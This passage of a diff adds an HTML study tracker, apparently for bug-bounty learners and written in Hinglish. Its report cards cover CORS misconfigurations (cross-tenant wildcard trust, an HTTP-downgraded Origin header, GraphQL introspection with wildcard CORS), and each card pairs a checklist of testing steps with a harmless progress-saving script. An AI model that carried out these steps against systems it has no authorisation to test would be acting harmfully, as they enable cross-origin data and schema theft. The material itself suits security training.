+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Cross-tenant CORS test karo</strong> — Apne tenant subdomain ko
+                            Origin mein dalke doosre tenant ki API hit karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Subdomain customization abuse karo</strong> — Agar custom
+                            subdomain choose kar sakte ho, toh phishing-style subdomain banao.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                    <div class="mindset-text">"Wildcard trust in multi-tenant = Zero tenant isolation." Agar har tenant
+                        ek wildcard subdomain se trusted hai, toh koi bhi tenant kisi ka bhi data dekh sakta hai."</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #11 — Protocol Downgrade -->
+        <div class="report-card" data-severity="medium" id="report-11">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #11 · BONUS · Bugcrowd</div>
+                    <div class="report-title">CORS via Protocol Downgrade (HTTPS → HTTP Origin)</div>
+                    <div class="report-target">🎯 ██████.com (Banking) · Bugcrowd · $1,000 · MitM + Data Leak</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Protocol Downgrade</span><span
+                            class="technique-tag">HTTP/HTTPS Mix</span><span class="technique-tag">MitM Chain</span>
+                    </div>
+                </div><span class="severity-badge sev-medium">🟡 MEDIUM</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Server sirf HTTPS whitelisted domains check kar raha tha. Hacker ne <code
+                            class="c">Origin: http://trusted.target.com</code> (HTTP bina 's') bheja → Server ne allow
+                        kiya! Agar attacker same network par ho (café WiFi) toh HTTP request ko intercept + modify kar
+                        sakta hai → Even HTTPS sites se data churaya ja sakta hai.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Protocol switch karo</strong> — <code class="c">https://</code> →
+                            <code class="c">http://</code> se Origin bhejo, accept hota hai ya nahi.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Mixed content check karo</strong> — HTTPS site se HTTP resources
+                            load ho rahe hain?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>MitM scenario describe karo</strong> — Public WiFi + HTTP
+                            downgrade = Realistic attack vector.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS #12 — GraphQL + CORS -->
+        <div class="report-card" data-severity="critical" id="report-12">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #12 · BONUS · Bugcrowd</div>
+                    <div class="report-title">GraphQL Introspection + CORS = Full Schema Leak</div>
+                    <div class="report-target">🎯 ██████.com (Startup) · Bugcrowd · $2,500 · Full DB Schema + PII</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">GraphQL</span><span
+                            class="technique-tag">Introspection</span><span class="technique-tag">Schema Leak</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">GraphQL endpoint (<code class="c">/graphql</code>) par introspection
+                        enabled + CORS wildcard (<code class="c">*</code>) tha. Hacker ne malicious page se cross-origin
+                        introspection query bheji → Poora database schema + user queries leak → Sensitive mutations
+                        discover karke unauthorized actions perform kiye.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>GraphQL endpoints dhoondho</strong> — <code
+                                class="c">/graphql</code>, <code class="c">/v1/graphql</code>, <code
+                                class="c">/api/graphql</code>, <code class="c">/query</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>CORS + Introspection combo test karo</strong> — Cross-origin se
+                            <code class="c">__schema</code> query bhejo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Sensitive mutations find karo</strong> — Schema se <code
+                                class="c">deleteUser</code>, <code class="c">updateRole</code>, <code
+                                class="c">transferFunds</code> dhoondho.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</section>
+
+<!-- ═══ FOOTER ═══ -->
+<footer class="mission-footer">
+    <p class="footer-text">⬡ MISSION 10 — CORS MASTERY ⬡ 30 REPORTS ⬡ 6 PHASES ⬡ COMPLETE REGISTER ⬡</p>
+</footer>
+
+<script>
+    const STORAGE_KEY = 'm10_cors_state';
+    function toggleItem(el) { el.classList.toggle('done'); saveState(); updateCardProgress(el.closest('.report-card')); updateMasterProgress(); }
+    function updateCardProgress(card) {
+        if (!card) return;
+        const items = card.querySelectorAll('.checklist-item'), done = card.querySelectorAll('.checklist-item.done');
+        const pct = items.length ? Math.round((done.length / items.length) * 100) : 0;
+        const pctEl = card.querySelector('.card-progress-pct'), barEl = card.querySelector('.card-bar-fill');
+        if (pctEl) pctEl.textContent = pct + '%'; if (barEl) barEl.style.width = pct + '%';
+    }
+    function updateMasterProgress() {
+        const allItems = document.querySelectorAll('.checklist-item'), allDone = document.querySelectorAll('.checklist-item.done');
+        const pct = allItems.length ? Math.round((allDone.length / allItems.length) * 100) : 0;
+        document.getElementById('masterPct').textContent = pct + '%';
+        document.getElementById('masterBar').style.width = pct + '%';
+        document.getElementById('completedItems').textContent = allDone.length;
+        let completedCards = 0;
+        document.querySelectorAll('.report-card').forEach(c => {
+            const t = c.querySelectorAll('.checklist-item').length, d = c.querySelectorAll('.checklist-item.done').length;
+            if (t > 0 && t === d) completedCards++;
+        });
+        document.getElementById('completedCards').textContent = completedCards;
+        ['phase1', 'phase2', 'phase3', 'phase4', 'phase5', 'phase6'].forEach((pid, i) => {
+            const sec = document.getElementById(pid); if (!sec) return;
+            const cards = sec.querySelectorAll('.report-card'), done = [...cards].filter(c => { const t = c.querySelectorAll('.checklist-item').length; return t > 0 && t === c.querySelectorAll('.checklist-item.done').length; });
+            const countEl = document.getElementById('p' + (i + 1) + 'count');
+            if (countEl) countEl.textContent = done.length + ' / ' + cards.length + ' reports';
+        });
+    }
+    function filterCards(type, btn) {
+        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+        if (btn) btn.classList.add('active');
+        document.querySelectorAll('.report-card').forEach(card => {
+            const sev = card.dataset.severity, items = card.querySelectorAll('.checklist-item'), doneItems = card.querySelectorAll('.checklist-item.done');
+            const isComplete = items.length > 0 && items.length === doneItems.length, isIncomplete = doneItems.length > 0 && !isComplete;
+            let show = false;
+            if (type === 'all') show = true;
+            else if (type === 'critical') show = sev === 'critical';
+            else if (type === 'high') show = sev === 'high';
+            else if (type === 'medium') show = sev === 'medium';
+            else if (type === 'complete') show = isComplete;
+            else if (type === 'incomplete') show = isIncomplete || doneItems.length === 0;
+            card.style.display = show ? '' : 'none';
+        });
+    }
+    function saveState() {
+        const state = {};
+        document.querySelectorAll('.report-card').forEach(card => {
+            const id = card.id, items = [];
+            card.querySelectorAll('.checklist-item').forEach((item, i) => { if (item.classList.contains('done')) items.push(i); });
+            if (items.length) state[id] = items;
+        });
+        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); } catch (e) { }
+    }
+    function loadState() {
+        try {
+            const raw = localStorage.getItem(STORAGE_KEY); if (!raw) return;
+            const state = JSON.parse(raw);
+            Object.keys(state).forEach(id => {
+                const card = document.getElementById(id); if (!card) return;
+                const items = card.querySelectorAll('.checklist-item');
+                state[id].forEach(i => { if (items[i]) items[i].classList.add('done'); });
+                updateCardProgress(card);
+            });
+        } catch (e) { }
+        updateMasterProgress();
+    }
+    loadState();
+</script>
+</body>
+
+</html>
